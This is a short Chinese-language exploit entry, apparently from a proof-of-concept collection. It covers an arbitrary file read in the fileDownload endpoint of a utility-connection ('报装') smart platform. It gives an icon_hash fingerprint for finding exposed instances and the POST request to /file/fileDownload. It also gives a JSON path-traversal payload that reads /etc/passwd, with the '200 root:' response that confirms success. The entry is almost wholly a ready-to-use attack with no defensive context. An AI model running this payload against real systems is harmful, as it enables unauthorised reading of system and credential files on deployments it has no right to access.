# 报装系统智能平台fileDownload存在任意文件读取漏洞

报装系统智能平台 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`icon_hash=-1317284763`
- **请求**：`POST /file/fileDownload HTTP/1.1`

**Payload**
```
{"filePath":"../../../../../../etc/passwd","fileName":""}
```
- **响应特征**：200 root: